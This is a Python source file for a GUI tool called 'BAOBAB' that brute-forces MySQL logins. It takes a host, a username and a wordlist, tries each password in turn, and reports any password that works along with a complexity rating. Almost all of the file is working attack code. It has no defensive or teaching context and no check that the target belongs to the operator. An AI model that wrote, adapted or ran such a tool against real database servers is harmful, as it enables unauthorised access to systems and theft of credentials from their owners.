from tkinter import filedialog, scrolledtext
import customtkinter as ctk
import threading
import mysql.connector
import re
import time
import logging

# Setup du logging pour les erreurs
logging.basicConfig(filename='baobab_errors.log', level=logging.ERROR, format='%(asctime)s %(levelname)s: %(message)s')

# Fonction pour classifier la complexité d'un mot de passe
def classify_password(password):
    if re.match(r"^(?=.*[0-9])(?=.*[!?@#$%^&*])[a-zA-Z0-9!?@#$%^&*]{2,}$", password):
        return "[High]"
    elif re.match(r"^(?=.*[0-9])[a-zA-Z0-9]{2,}$", password):
        return "[Medium]"
    else:
        return "[Low]"

class BruteForceSQL:
    def __init__(self, host, user, wordlist_path, output_label, output_area, progress_bar):
        self.host = host
        self.user = user
        self.wordlist_path = wordlist_path
        self.output_label = output_label
        self.output_area = output_area
        self.progress_bar = progress_bar
        self.thread = None
        self.stop_thread = False

    def start(self):
        self.thread = threading.Thread(target=self.brute_force)
        self.thread.start()

    def stop(self):
        self.stop_thread = True
        if self.thread is not None:
            self.thread.join()

    def brute_force(self):
        try:
            with open(self.wordlist_path, 'r', encoding='utf-8') as file:
                passwords = file.readlines()
            total_lines = len(passwords)

            for index, password in enumerate(passwords, start=1):
                if self.stop_thread:
                    break
                password = password.strip()

                progress =  (index / total_lines) * 100
                self.update_gui(f"Attempt {index}/{total_lines}: {password}", progress)

                try:
                    connection =  mysql.connector.connect(host=self.host, user=self.user, password=password)
                    if connection.is_connected():
                        connection.close()
                        self.update_gui(f"Password found: {password}, Complexity: {classify_password(password)}", 100)
                        break
                except mysql.connector.Error as e:
                    logging.error(f"MySQL error: {e}")
        except FileNotFoundError:
            self.update_gui("Wordlist file not found.", 0)
            logging.error("Wordlist file not found.")
        except Exception as e:
            self.update_gui(f"Unexpected error: {e}", 0)
            logging.error(f"Unexpected error: {e}")

    def update_gui(self, message, progress):
        if self.output_label:
            self.output_label.configure(text=message)
        if self.output_area:
            self.output_area.insert('end', f"{message}\n")
            self.output_area.see('end')
        if self.progress_bar:
            self.progress_bar.set(progress)
    
class BruteForceGUI:
    def __init__(self):
        self.window = ctk.CTk()
        self.window.title("BAOBAB : Best And Overpowered Beating Ass Brute-force")
        self.setup_widgets()
        self.brute_force_instance = None
    
    def setup_widgets(self):
        #Input de l'hôte
        ctk.CTkLabel(self.window, text="MySQL Host:").pack(pady=10, padx=0)
        self.host_input = ctk.CTkEntry(self.window)
        self.host_input.pack(pady=0, padx=10)
    
        # Input de l'utilisateur
        ctk.CTkLabel(self.window, text="MySQL User:").pack(pady=10, padx=0)
        self.user_input = ctk.CTkEntry(self.window)
        self.user_input.pack(pady=0, padx=10)

        #Input pour la wordlist
        ctk.CTkLabel(self.window, text="Path to wordlist:").pack(pady=10, padx=0)
        wordlist_frame = ctk.CTkFrame(self.window)
        wordlist_frame.pack(pady=0, padx=50)
        self.wordlist_input = ctk.CTkEntry(wordlist_frame)
        self.wordlist_input.pack(side='left', fill='x', expand=True)
        ctk.CTkButton(wordlist_frame, text="Browse", command=self.browse_file).pack(side='right')

        # Zone de texte scrollable pour le logging détaillé
        self.output_area = scrolledtext.ScrolledText(self.window, height=10, padx=10, pady=10)
        self.output_area.pack(pady=50)

        # Barre de progression
        self.progress_bar = ctk.CTkProgressBar(self.window)
        self.progress_bar.pack(pady=10)

        # Label de l'output
        self.output_label = ctk.CTkLabel(self.window, text="Ready")
        self.output_label.pack(pady=10)

        # Bouton pour démarrer / arrêter le bruteforce
        self.start_button = ctk.CTkButton(self.window, text="Start Brute-Force", command=self.start_brute_force)
        self.start_button.pack(pady=10)

        self.stop_button = ctk.CTkButton(self.window, text="Stop Brute-Force", command=self.stop_brute_force)
        self.stop_button.pack(pady=10)

    def browse_file(self):
        self.wordlist_input.delete(0, 'end')
        self.wordlist_input.insert(0, filedialog.askopenfilename())
        
    def start_brute_force(self):
        self.brute_force_instance = BruteForceSQL(self.host_input.get(), self.user_input.get(), self.wordlist_input.get(), self.output_label, self.output_area, self.progress_bar)
        self.brute_force_instance.start()

    def stop_brute_force(self):
        if self.brute_force_instance:
            self.brute_force_instance.stop()
        
    def run(self):
        self.window.mainloop()

# Démarrage de l'interface graphique
BruteForceGUI().run()
